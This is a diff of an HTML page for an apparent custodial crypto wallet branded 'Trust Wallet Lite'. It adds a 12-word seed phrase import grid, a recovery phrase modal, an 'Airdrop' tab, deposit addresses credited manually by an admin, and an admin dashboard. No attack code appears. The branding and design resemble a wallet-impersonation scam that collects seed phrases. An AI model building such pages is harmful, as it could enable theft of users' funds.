@@ -6,8 +6,7 @@
     <title>Trust Wallet Lite • Secure Crypto Wallet</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <!-- ✅ No Firebase Client SDK here! All Firebase operations go through backend API -->
 </head>
 <body>
 
@@ -35,7 +34,7 @@
         </div>
     </div>
 
-    <!-- ========== IMPORT WALLET MODAL ========== -->
+    <!-- ========== IMPORT WALLET MODAL (12 Words Grid) ========== -->
     <div id="importModal" class="modal">
         <div class="modal-content import-modal-content">
             <div class="modal-header">
@@ -53,6 +52,7 @@
 
     <!-- ========== MAIN APP CONTENT ========== -->
     <div id="mainContent" class="main-content" style="display: none;">
+        <!-- Header with Gradient Background -->
         <div class="app-header">
             <div class="header-top">
                 <div class="wallet-selector">
@@ -60,7 +60,7 @@
                     <span>Main Wallet</span>
                 </div>
                 <div class="header-actions">
-                    <button id="notificationBtn" class="icon-btn">
+                    <button id="notificationBtn" class="icon-btn" onclick="showNotifications()">
                         <i class="fa-regular fa-bell"></i>
                         <span class="badge hidden">0</span>
                     </button>
@@ -81,7 +81,7 @@
             <div id="welcomeSticker" class="welcome-sticker"></div>
         </div>
 
-        <!-- Tab Contents -->
+        <!-- Tab Contents - All 5 Sections -->
         <div id="walletSection" class="tab-content active">
             <div id="walletContainer"></div>
         </div>
@@ -114,7 +114,7 @@
             </button>
             <button class="nav-item" data-tab="referral">
                 <i class="fas fa-users"></i>
-                <span>Referral</span>
+                <span>Airdrop</span>
             </button>
             <button class="nav-item" data-tab="twtpay">
                 <i class="fas fa-credit-card"></i>
@@ -127,7 +127,7 @@
         </div>
     </div>
 
-    <!-- ========== MODALS ========== -->
+    <!-- ========== SEND MODAL ========== -->
     <div id="sendModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
@@ -135,11 +135,20 @@
                 <button class="close-modal" onclick="closeModal('sendModal')"><i class="fas fa-times"></i></button>
             </div>
             <div class="modal-body">
-                <div class="currency-selector" onclick="showCurrencySelector('send')">
-                    <img id="sendCurrencyIcon" src="https://s2.coinmarketcap.com/static/img/coins/64x64/5964.png">
-                    <span id="sendCurrencySymbol">TWT</span>
-                    <i class="fas fa-chevron-down"></i>
-                </div>
+                <select id="sendCurrency" class="modal-input">
+                    <option value="TWT">TWT</option>
+                    <option value="USDT">USDT</option>
+                    <option value="BNB">BNB</option>
+                    <option value="BTC">BTC</option>
+                    <option value="ETH">ETH</option>
+                    <option value="SOL">SOL</option>
+                    <option value="TRX">TRX</option>
+                    <option value="ADA">ADA</option>
+                    <option value="DOGE">DOGE</option>
+                    <option value="SHIB">SHIB</option>
+                    <option value="PEPE">PEPE</option>
+                    <option value="TON">TON</option>
+                </select>
                 <input type="number" id="sendAmount" class="modal-input" placeholder="0.00">
                 <input type="text" id="sendAddress" class="modal-input" placeholder="Recipient address">
                 <button class="btn-primary" onclick="sendTransaction()"><i class="fas fa-paper-plane"></i> Send</button>
@@ -147,6 +156,7 @@
         </div>
     </div>
 
+    <!-- ========== RECEIVE MODAL ========== -->
     <div id="receiveModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
@@ -158,11 +168,15 @@
                     <code id="receiveAddress"></code>
                     <button class="copy-btn" onclick="copyAddress()"><i class="fas fa-copy"></i></button>
                 </div>
-                <div class="qr-placeholder"><i class="fas fa-qrcode"></i></div>
+                <div class="qr-placeholder">
+                    <i class="fas fa-qrcode"></i>
+                    <p>Your Wallet Address</p>
+                </div>
             </div>
         </div>
     </div>
 
+    <!-- ========== DEPOSIT MODAL ========== -->
     <div id="depositModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
@@ -170,12 +184,20 @@
                 <button class="close-modal" onclick="closeModal('depositModal')"><i class="fas fa-times"></i></button>
             </div>
             <div class="modal-body">
-                <div class="currency-selector" onclick="showCurrencySelector('deposit')">
-                    <img id="depositCurrencyIcon" src="https://s2.coinmarketcap.com/static/img/coins/64x64/5964.png">
-                    <span id="depositCurrencySymbol">TWT</span>
-                    <i class="fas fa-chevron-down"></i>
-                </div>
-                <input type="number" id="depositAmount" class="modal-input" placeholder="Amount">
+                <select id="depositCurrency" class="modal-input" onchange="updateDepositInfo()">
+                    <option value="TWT">TWT</option>
+                    <option value="USDT">USDT</option>
+                    <option value="BNB">BNB</option>
+                    <option value="BTC">BTC</option>
+                    <option value="ETH">ETH</option>
+                    <option value="SOL">SOL</option>
+                    <option value="TRX">TRX</option>
+                    <option value="ADA">ADA</option>
+                    <option value="DOGE">DOGE</option>
+                    <option value="SHIB">SHIB</option>
+                    <option value="PEPE">PEPE</option>
+                    <option value="TON">TON</option>
+                </select>
                 <div class="address-box">
                     <code id="depositAddress"></code>
                     <button class="copy-btn" onclick="copyDepositAddress()"><i class="fas fa-copy"></i></button>
@@ -183,12 +205,14 @@
                 <p class="min-hint">Min: <span id="depositMinAmount">10</span> TWT</p>
                 <div class="deposit-note">
                     <i class="fas fa-info-circle"></i>
-                    <span>✓ Send funds to this unique address. Admin will add balance manually after verification.</span>
+                    <span>✓ Send funds to this address. Admin will add balance manually after verification.</span>
                 </div>
+                <button class="btn-primary" onclick="copyDepositAddress()"><i class="fas fa-copy"></i> Copy Address</button>
             </div>
         </div>
     </div>
 
+    <!-- ========== WITHDRAW MODAL ========== -->
     <div id="withdrawModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
@@ -196,11 +220,20 @@
                 <button class="close-modal" onclick="closeModal('withdrawModal')"><i class="fas fa-times"></i></button>
             </div>
             <div class="modal-body">
-                <div class="currency-selector" onclick="showCurrencySelector('withdraw')">
-                    <img id="withdrawCurrencyIcon" src="https://s2.coinmarketcap.com/static/img/coins/64x64/5964.png">
-                    <span id="withdrawCurrencySymbol">TWT</span>
-                    <i class="fas fa-chevron-down"></i>
-                </div>
+                <select id="withdrawCurrency" class="modal-input" onchange="updateWithdrawInfo()">
+                    <option value="TWT">TWT</option>
+                    <option value="USDT">USDT</option>
+                    <option value="BNB">BNB</option>
+                    <option value="BTC">BTC</option>
+                    <option value="ETH">ETH</option>
+                    <option value="SOL">SOL</option>
+                    <option value="TRX">TRX</option>
+                    <option value="ADA">ADA</option>
+                    <option value="DOGE">DOGE</option>
+                    <option value="SHIB">SHIB</option>
+                    <option value="PEPE">PEPE</option>
+                    <option value="TON">TON</option>
+                </select>
                 <input type="number" id="withdrawAmount" class="modal-input" placeholder="Amount">
                 <input type="text" id="withdrawAddress" class="modal-input" placeholder="Withdrawal address">
                 <p class="fee-hint">Network fee: <span id="withdrawFee">1 TWT</span></p>
@@ -210,6 +243,7 @@
         </div>
     </div>
 
+    <!-- ========== CURRENCY SELECTOR MODAL ========== -->
     <div id="currencySelectorModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
@@ -217,12 +251,12 @@
                 <button class="close-modal" onclick="closeModal('currencySelectorModal')"><i class="fas fa-times"></i></button>
             </div>
             <div class="modal-body">
-                <input type="text" id="currencySearch" class="modal-input" placeholder="Search currency...">
                 <div id="currencyList" class="currency-list"></div>
             </div>
         </div>
     </div>
 
+    <!-- ========== NOTIFICATIONS MODAL ========== -->
     <div id="notificationsModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
@@ -235,6 +269,7 @@
         </div>
     </div>
 
+    <!-- ========== HISTORY MODAL ========== -->
     <div id="historyModal" class="modal">
         <div class="modal-content history-modal-content">
             <div class="modal-header">
@@ -247,19 +282,26 @@
         </div>
     </div>
 
+    <!-- ========== RECOVERY PHRASE MODAL ========== -->
+    <div id="recoveryModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-key"></i> Recovery Phrase</h3>
+                <button class="close-modal" onclick="closeModal('recoveryModal')"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <p class="warning-text">⚠️ Write this down and keep it safe!</p>
+                <div id="recoveryPhraseDisplay" class="recovery-phrase-box"></div>
+                <button class="btn-primary" onclick="copyRecoveryPhrase()"><i class="fas fa-copy"></i> Copy</button>
+            </div>
+        </div>
+    </div>
+
     <!-- ========== ADMIN PANEL ========== -->
     <div id="adminPanel" class="admin-panel hidden">
         <div class="admin-header">
             <h3><i class="fas fa-crown"></i> Admin Dashboard</h3>
             <button onclick="closeAdminPanel()" class="close-admin"><i class="fas fa-times"></i></button>
-        </div>
-        <div class="admin-tabs">
-            <button class="admin-tab active" onclick="showAdminTab('pending')">
-                <i class="fas fa-clock"></i> Pending
-            </button>
-            <button class="admin-tab" onclick="showAdminTab('users')">
-                <i class="fas fa-users"></i> User Management
-            </button>
         </div>
         <div id="adminContent" class="admin-content"></div>
         <div class="admin-refresh-container">
@@ -269,12 +311,13 @@
         </div>
     </div>
 
-    <!-- ========== TOAST ========== -->
+    <!-- ========== TOAST NOTIFICATION ========== -->
     <div id="toast" class="toast hidden">
         <i class="fa-regular fa-circle-check"></i>
         <span id="toastMessage"></span>
     </div>
 
+    <!-- ========== SCROLL TO TOP BUTTON ========== -->
     <button id="scrollTopBtn" class="scroll-top-btn hidden" onclick="scrollToTop()">
         <i class="fas fa-arrow-up"></i>
     </button>
